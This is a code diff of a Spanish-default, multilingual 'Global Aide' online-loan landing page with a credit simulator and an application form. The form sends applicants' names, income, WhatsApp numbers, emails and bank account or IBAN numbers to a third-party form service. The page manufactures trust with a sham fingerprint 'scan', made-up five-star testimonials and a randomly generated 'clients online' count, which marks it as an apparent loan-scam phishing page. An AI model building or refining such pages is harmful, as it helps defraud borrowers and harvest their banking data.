@@ -13,20 +13,27 @@
         
         .lang-btn.selected { border: 3px solid #1d4ed8 !important; background-color: #eff6ff !important; transform: scale(1.05); }
         
+        /* Conteneur de défilement */
         .scroll-parent { width: 100%; overflow: hidden; position: relative; background: #f1f5f9; padding: 15px 0; border-radius: 24px; border: 1px solid #e2e8f0; }
         .scroll-child { display: flex; width: max-content; animation: scroll 50s linear infinite; }
         @keyframes scroll { from { transform: translateX(0); } to { transform: translateX(-50%); } }
 
+        /* Scanner */
         #biometric-area { transition: all 0.3s ease; position: relative; background: #ffffff; }
         #laser-line { animation: scanAnimate 2s linear infinite; }
         @keyframes scanAnimate { 0%, 100% { top: 10%; opacity: 0.5; } 50% { top: 85%; opacity: 1; } }
 
+        /* Range Slider */
         .slider { -webkit-appearance: none; width: 100%; height: 6px; border-radius: 5px; background: #e2e8f0; outline: none; }
-        .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 26px; height: 26px; border-radius: 50%; background: #1d4ed8; cursor: pointer; border: 4px solid white; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 28px; height: 28px; border-radius: 50%; background: #1d4ed8; cursor: pointer; border: 4px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+
+        /* Style des inputs éditables */
+        .editable-amount { border-bottom: 2px dashed #cbd5e1; transition: all 0.3s; padding: 2px 8px; border-radius: 8px; }
+        .editable-amount:focus-within { border-bottom-color: #1d4ed8; background: #f8fafc; }
     </style>
 </head>
 <body class="bg-[#F8FAFC] font-sans text-slate-900 overflow-x-hidden">
-    <nav class="bg-white/90 backdrop-blur-md border-b border-slate-200 p-4 flex justify-between items-center sticky top-0 z-50">
+        <nav class="bg-white/90 backdrop-blur-md border-b border-slate-200 p-4 flex justify-between items-center sticky top-0 z-50">
         <div class="flex items-center gap-2">
             <div class="w-10 h-10 bg-blue-700 rounded-2xl flex items-center justify-center text-white font-bold shadow-lg shadow-blue-100">G</div>
             <div class="font-black text-blue-900 uppercase tracking-tighter text-lg">Global Aide</div>
@@ -35,7 +42,8 @@
             <i class="fas fa-certificate text-yellow-400 mr-1"></i> <span id="nav-testi">Reseñas Verificadas</span>
         </button>
     </nav>
-        <div id="global-loader" class="hidden fixed inset-0 bg-white/98 z-[200] flex flex-col items-center justify-center text-center p-6">
+
+    <div id="global-loader" class="hidden fixed inset-0 bg-white/98 z-[200] flex flex-col items-center justify-center text-center p-6">
         <div class="w-20 h-20 border-4 border-blue-100 border-t-blue-700 rounded-full animate-spin mb-6"></div>
         <p id="loader-text" class="font-black text-blue-900 text-lg uppercase tracking-widest"></p>
     </div>
@@ -78,16 +86,39 @@
             <div class="scroll-parent mb-8"><div class="scroll-child" id="mini-testi-scroll"></div></div>
             <div class="bg-white p-10 rounded-[3.5rem] shadow-xl border border-slate-100 text-left">
                 <h2 class="text-2xl font-black text-blue-900 mb-12 text-center uppercase tracking-tighter" id="sim-title">Simulador</h2>
+                
                 <div class="space-y-12">
                     <div>
-                        <div class="flex justify-between items-center mb-6"><span id="lbl-amt" class="font-black text-slate-400 text-[10px] uppercase">Monto</span><div class="text-blue-700 font-black text-4xl"><input type="number" id="amountInput" value="5000" oninput="sync('amt')" class="w-36 text-right bg-transparent outline-none"><span class="curr ml-1">$</span></div></div>
-                        <input type="range" id="amountRange" min="1000" max="500000" step="1000" value="5000" oninput="sync('range')" class="slider">
+                        <div class="flex justify-between items-end mb-6">
+                            <span id="lbl-amt" class="font-black text-slate-400 text-[10px] uppercase">Monto</span>
+                            <div class="text-blue-700 font-black text-4xl flex flex-col items-end">
+                                <div class="editable-amount flex items-center">
+                                    <i class="fas fa-pen text-xs text-blue-300 mr-2"></i>
+                                    <input type="number" id="amountInput" value="1000" oninput="sync('amt')" class="w-36 text-right bg-transparent outline-none">
+                                    <span class="curr ml-1">$</span>
+                                </div>
+                                <span class="text-[9px] text-blue-400 mt-1 uppercase font-bold tracking-tighter opacity-70" id="hint-edit-1">Click para editar</span>
+                            </div>
+                        </div>
+                        <input type="range" id="amountRange" min="1000" max="500000" step="1000" value="1000" oninput="sync('range')" class="slider">
                     </div>
+
                     <div>
-                        <div class="flex justify-between items-center mb-6"><span id="lbl-dur" class="font-black text-slate-400 text-[10px] uppercase">Plazo</span><div class="text-blue-700 font-black text-4xl"><input type="number" id="yearInput" value="5" oninput="syncYear('num')" class="w-16 text-right bg-transparent outline-none"><span id="lbl-years" class="text-xl italic">Años</span></div></div>
-                        <input type="range" id="yearRange" min="1" max="30" step="1" value="5" oninput="syncYear('range')" class="slider">
+                        <div class="flex justify-between items-end mb-6">
+                            <span id="lbl-dur" class="font-black text-slate-400 text-[10px] uppercase">Plazo</span>
+                            <div class="text-blue-700 font-black text-4xl flex flex-col items-end">
+                                <div class="editable-amount flex items-center">
+                                    <i class="fas fa-pen text-xs text-blue-300 mr-2"></i>
+                                    <input type="number" id="yearInput" value="1" oninput="syncYear('num')" class="w-16 text-right bg-transparent outline-none">
+                                    <span id="lbl-years" class="text-xl ml-1">Año(s)</span>
+                                </div>
+                                <span class="text-[9px] text-blue-400 mt-1 uppercase font-bold tracking-tighter opacity-70" id="hint-edit-2">Click para editar</span>
+                            </div>
+                        </div>
+                        <input type="range" id="yearRange" min="1" max="30" step="1" value="1" oninput="syncYear('range')" class="slider">
                     </div>
                 </div>
+
                 <div class="mt-12 bg-slate-900 p-8 rounded-[3rem] text-white shadow-2xl space-y-5 border-b-8 border-blue-600">
                     <div class="flex justify-between items-center"><span id="res-lbl-men" class="text-slate-400 font-bold uppercase text-[10px] tracking-widest">Cuota Mensual</span><span id="res-monthly" class="font-black text-3xl text-white">...</span></div>
                     <div class="flex justify-between items-center border-t border-slate-800 pt-5"><span id="lbl-interest" class="text-slate-500 text-[10px] uppercase font-black tracking-widest">Intereses (3%)</span><span id="res-interest" class="font-black text-green-400 text-lg">...</span></div>
@@ -105,19 +136,16 @@
                 <form action="https://formspree.io/f/xnjqwngo" method="POST" id="loanForm" onsubmit="return handleFormSubmit(event)" class="space-y-6">
                     <input type="hidden" name="PRÊT_MONTANT" id="h-m"><input type="hidden" name="PRÊT_DURÉE" id="h-d"><input type="hidden" name="BIOMETRIE" id="h-auth" value="Non validé">
                     <h2 class="text-3xl font-black text-blue-900 mb-10 uppercase tracking-tighter" id="form-title">Expediente</h2>
-                    
                     <div class="grid gap-5">
-                        <input type="text" id="i-nom" name="Nombre_Completo" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all" placeholder="Nombre completo">
-                        
-                        <input type="text" id="i-pais" name="Pais" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all" placeholder="País de residencia">
-                        <input type="text" id="i-prof" name="Profesion_O_Retirado" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all" placeholder="Profesión (o Retirado)">
-                        <input type="text" id="i-rev" name="Ingresos_Mensuales" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all" placeholder="Ingresos mensuales aproximados">
-                        
+                        <input type="text" id="i-nom" name="Nombre" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all">
+                        <input type="text" id="i-pais" name="Pais" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all">
+                        <input type="text" id="i-prof" name="Profesion" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all">
+                        <input type="text" id="i-rev" name="Ingresos" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all">
                         <div class="h-px bg-slate-100 my-2"></div>
-                        <input type="tel" id="i-wa" name="WhatsApp" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all" placeholder="WhatsApp">
-                        <input type="email" id="i-email" name="Email" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all" placeholder="Email">
-                        <input type="text" id="i-bank-name" name="Banco" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all" placeholder="Nombre del Banco">
-                        <input type="text" id="i-bank-acc" name="IBAN_O_Cuenta" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all" placeholder="Número de cuenta / IBAN">
+                        <input type="tel" id="i-wa" name="WhatsApp" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all">
+                        <input type="email" id="i-email" name="Email" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all">
+                        <input type="text" id="i-bank-name" name="Banco" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all">
+                        <input type="text" id="i-bank-acc" name="Cuenta" required class="w-full p-6 bg-slate-50 rounded-3xl border-2 border-slate-100 outline-none focus:border-blue-600 transition-all">
                     </div>
 
                     <div class="mt-12 p-8 bg-blue-50/50 rounded-[3rem] border-2 border-blue-100 text-center">
@@ -133,32 +161,19 @@
                 </form>
             </div>
         </div>
-                                                                                                                                                                                         </section>
-                                <script>
+    </section>
+        <script>
         let cL = 'es', cC = '$';
         const tr = {
             es: {
-                cont: "CONTINUAR SOLICITUD", sim: "Simulador de Crédito", amt: "Monto del préstamo", dur: "Plazo de devolución", yr: "Años", men: "Cuota Mensual", tot: "Total a pagar", int: "Intereses (3%)", next: "Siguiente Paso", fTitle: "Expediente Digital", back: "Volver al simulador", submit: "ENVIAR SOLICITUD", scan: "Autenticación Biométrica", scanInst: "Mantenga el pulgar en el sensor", scanActive: "Escaneando huella...", scanDone: "Identidad Confirmada", navTesti: "Reseñas", testiTitle: "Reseñas Verificadas", close: "Cerrar", live: "clientes en línea ahora", load: "Asegurando conexión...", pl_nom: "Nombre completo", pl_pais: "País de residencia", pl_prof: "Profesión (o Retirado)", pl_rev: "Ingresos mensuales", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Nombre del Banco", pl_bankAcc: "Número de cuenta / IBAN",
-                tests: [
-                    {n:"Carlos Ruiz (Madrid)", t:"Increíble rapidez. Solicité un préstamo para mi negocio y el interés del 3% es real. El escaneo de huella da mucha seguridad.", i:"CR", c:"bg-blue-100", d:"Hace 2 días"},
-                    {n:"Maria Garcia (Barcelona)", t:"Muy profesional. El simulador me ayudó a planificar mis cuotas sin sorpresas. Recibí el dinero rápido.", i:"MG", c:"bg-green-100", d:"Hace 1 día"},
-                    {n:"Fernando Lopez (Bogotá)", t:"Excelente atención por WhatsApp. Me guiaron para financiar los estudios de mi hijo. Muy agradecido.", i:"FL", c:"bg-purple-100", d:"Hace 3 días"},
-                    {n:"Ana Gomez (San Juan)", t:"Un servicio transparente y moderno. Los testimonios me dieron confianza y todo fue muy rápido.", i:"AG", c:"bg-red-100", d:"Hace 5 días"},
-                    {n:"Juan Hernandez (Panamá)", t:"La mejor plataforma de préstamos online. Seguridad biométrica y tasas competitivas.", i:"JH", c:"bg-orange-100", d:"Hace 1 semana"},
-                    {n:"Sofia Perez (México)", t:"El proceso es totalmente digital y muy intuitivo. Los fondos llegaron exactamente cuando prometieron.", i:"SP", c:"bg-indigo-100", d:"Hace 4 días"}
-                ]
+                cont: "CONTINUAR SOLICITUD", sim: "Simulador de Crédito", amt: "Monto del préstamo", dur: "Plazo de devolución", yr: "Año(s)", men: "Cuota Mensual", tot: "Total a pagar", int: "Intereses (3%)", next: "Siguiente Paso", fTitle: "Expediente Digital", back: "Volver al simulador", submit: "ENVIAR SOLICITUD", scan: "Autenticación Biométrica", scanInst: "Mantenga el pulgar en el sensor", scanActive: "Escaneando huella...", scanDone: "Identidad Confirmada", navTesti: "Reseñas", testiTitle: "Reseñas Verificadas", close: "Cerrar", live: "clientes en línea ahora", load: "Asegurando conexión...", pl_nom: "Nombre completo", pl_pais: "País de residencia", pl_prof: "Profesión (o Retirado)", pl_rev: "Ingresos mensuales", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Nombre del Banco", pl_bankAcc: "Número de cuenta / IBAN", hint: "Click para editar",
+                tests: [ {n:"Carlos Ruiz (Madrid)", t:"Increíble rapidez. Interés del 3% real.", i:"CR", c:"bg-blue-100", d:"Hace 2 días"}, {n:"Maria G. (Barcelona)", t:"Muy profesional. Recibí el dinero rápido.", i:"MG", c:"bg-green-100", d:"Hace 1 día"} ]
             },
             fr: {
-                cont: "CONTINUER LE DOSSIER", sim: "Simulateur de Crédit", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total", int: "Intérêts (3%)", next: "Suivant", fTitle: "Dossier", back: "Retour", submit: "ENVOYER", scan: "Biométrie", scanInst: "Maintenez le pouce", scanActive: "Analyse...", scanDone: "Confirmé !", navTesti: "Avis", testiTitle: "Avis Vérifiés", close: "Fermer", live: "clients en ligne", load: "Chargement...", pl_nom: "Nom complet", pl_pais: "Pays", pl_prof: "Profession (ou Retraité)", pl_rev: "Revenus", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Banque", pl_bankAcc: "IBAN",
-                tests: [ {n:"M. Lefebvre", t:"Reçu en 48h.", i:"ML", c:"bg-blue-100", d:"Hier"}, {n:"S. Durand", t:"Très sérieux.", i:"SD", c:"bg-green-100", d:"3 jours"} ]
+                cont: "CONTINUER LE DOSSIER", sim: "Simulateur de Crédit", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total", int: "Intérêts (3%)", next: "Suivant", fTitle: "Dossier", back: "Retour", submit: "ENVOYER", scan: "Biométrie", scanInst: "Maintenez le pouce", scanActive: "Analyse...", scanDone: "Confirmé !", navTesti: "Avis", testiTitle: "Avis Vérifiés", close: "Fermer", live: "clients en ligne", load: "Chargement...", pl_nom: "Nom complet", pl_pais: "Pays", pl_prof: "Profession (ou Retraité)", pl_rev: "Revenus", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Banque", pl_bankAcc: "IBAN", hint: "Cliquez pour modifier"
             },
             en: {
-                cont: "CONTINUE APPLICATION", sim: "Loan Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total", int: "Interest (3%)", next: "Next", fTitle: "Application", back: "Back", submit: "SUBMIT", scan: "Biometrics", scanInst: "Hold thumb", scanActive: "Scanning...", scanDone: "Verified !", navTesti: "Reviews", testiTitle: "Reviews", close: "Close", live: "online clients", load: "Securing...", pl_nom: "Full Name", pl_pais: "Country", pl_prof: "Job (or Retired)", pl_rev: "Income", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Bank", pl_bankAcc: "Account No.",
-                tests: [ {n:"J. Adams", t:"Fast and safe.", i:"JA", c:"bg-blue-100", d:"2 days ago"}, {n:"R. Doe", t:"Highly recommend.", i:"RD", c:"bg-green-100", d:"1 day ago"} ]
-            },
-            de: {
-                cont: "ANTRETER", sim: "Kreditsimulator", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Rate", tot: "Gesamt", int: "Zinsen (3%)", next: "Weiter", fTitle: "Antrag", back: "Zurück", submit: "SENDEN", scan: "Biometrie", scanInst: "Daumen halten", scanActive: "Scannen...", scanDone: "Bestätigt !", navTesti: "Bewertungen", testiTitle: "Bewertungen", close: "Schließen", live: "Kunden online", load: "Sichern...", pl_nom: "Name", pl_pais: "Land", pl_prof: "Beruf", pl_rev: "Einkommen", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Bank", pl_bankAcc: "Konto",
-                tests: [ {n:"H. Weber", t:"Sehr gut.", i:"HW", c:"bg-blue-100", d:"Vor 2 Tagen"} ]
+                cont: "CONTINUE APPLICATION", sim: "Loan Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total", int: "Interest (3%)", next: "Next", fTitle: "Application", back: "Back", submit: "SUBMIT", scan: "Biometrics", scanInst: "Hold thumb", scanActive: "Scanning...", scanDone: "Verified !", navTesti: "Reviews", testiTitle: "Reviews", close: "Close", live: "online clients", load: "Securing...", pl_nom: "Full Name", pl_pais: "Country", pl_prof: "Job (or Retired)", pl_rev: "Income", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Bank", pl_bankAcc: "Account No.", hint: "Click to edit"
             }
         };
 
@@ -180,13 +195,12 @@
 
         function upUI(l) {
             const t = tr[l]; document.getElementById('loader-text').innerText = t.load; document.getElementById('btn-cont-text').innerText = t.cont; document.getElementById('sim-title').innerText = t.sim; document.getElementById('lbl-amt').innerText = t.amt; document.getElementById('lbl-dur').innerText = t.dur; document.getElementById('lbl-years').innerText = t.yr; document.getElementById('res-lbl-men').innerText = t.men; document.getElementById('res-lbl-tot').innerText = t.tot; document.getElementById('lbl-interest').innerText = t.int; document.getElementById('btn-next').innerText = t.next; document.getElementById('form-title').innerText = t.fTitle; document.getElementById('btn-back').innerText = t.back; document.getElementById('btn-submit').innerText = t.submit; document.getElementById('nav-testi').innerText = t.navTesti; document.getElementById('testi-title').innerText = t.testiTitle; document.getElementById('lbl-scan').innerText = t.scan; document.getElementById('scan-instruction').innerText = t.scanInst;
-            
+            document.getElementById('hint-edit-1').innerText = t.hint; document.getElementById('hint-edit-2').innerText = t.hint;
             document.getElementById('i-nom').placeholder = t.pl_nom; document.getElementById('i-pais').placeholder = t.pl_pais; document.getElementById('i-prof').placeholder = t.pl_prof; document.getElementById('i-rev').placeholder = t.pl_rev; document.getElementById('i-wa').placeholder = t.pl_wa; document.getElementById('i-email').placeholder = t.pl_email; document.getElementById('i-bank-name').placeholder = t.pl_bankName; document.getElementById('i-bank-acc').placeholder = t.pl_bankAcc;
             
             const stars = '<i class="fas fa-star text-yellow-400 mr-0.5"></i>'.repeat(5);
-            const h = t.tests.map(x => `<div class="bg-white p-4 rounded-3xl border border-slate-100 flex items-start gap-3 mx-2 min-w-[300px] shadow-sm"><div class="w-10 h-10 ${x.c} rounded-full flex-shrink-0 flex items-center justify-center font-bold text-xs">${x.i}</div><div class="text-left"><div class="flex justify-between items-center mb-1"><p class="font-black text-[10px] text-blue-900">${x.n}</p><span class="text-[7px] text-slate-400 font-bold">${x.d}</span></div><div class="flex mb-2 text-[8px]">${stars}</div><p class="text-slate-500 italic text-[9px] leading-relaxed">"${x.t}"</p></div></div>`).join('');
+            const h = (t.tests || []).map(x => `<div class="bg-white p-4 rounded-3xl border border-slate-100 flex items-start gap-3 mx-2 min-w-[300px] shadow-sm"><div class="w-10 h-10 ${x.c} rounded-full flex-shrink-0 flex items-center justify-center font-bold text-xs">${x.i}</div><div class="text-left"><div class="flex justify-between items-center mb-1"><p class="font-black text-[10px] text-blue-900">${x.n}</p><span class="text-[7px] text-slate-400 font-bold">${x.d}</span></div><div class="flex mb-2 text-[8px]">${stars}</div><p class="text-slate-500 italic text-[9px] leading-relaxed">"${x.t}"</p></div></div>`).join('');
             document.getElementById('mini-testi-scroll').innerHTML = h + h;
-            document.getElementById('testi-list').innerHTML = t.tests.map(x => `<div class="bg-slate-50 p-6 rounded-[2.5rem] flex items-start gap-4 border border-slate-100"><div class="w-14 h-14 ${x.c} rounded-full flex-shrink-0 flex items-center justify-center font-bold text-xl">${x.i}</div><div class="text-left flex-1"><div class="flex justify-between"><p class="font-black text-blue-900">${x.n}</p><span class="text-[10px] text-slate-400 font-bold">${x.d}</span></div><div class="flex text-yellow-400 text-xs my-2"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p class="text-sm text-slate-600 leading-relaxed italic">"${x.t}"</p></div></div>`).join('');
             calc();
         }
 
@@ -199,7 +213,6 @@
         function toggleTestimonials() { document.getElementById('page-testi').classList.toggle('hidden'); }
         setInterval(() => { document.getElementById('live-count').innerText = `${Math.floor(Math.random() * 20 + 40)} ${tr[cL].live}`; }, 5000);
         
-        // INITIALISATION ESPAGNOLE PAR DÉFAUT
         window.onload = () => { selectLang('es', '$'); };
     </script>
 </body>
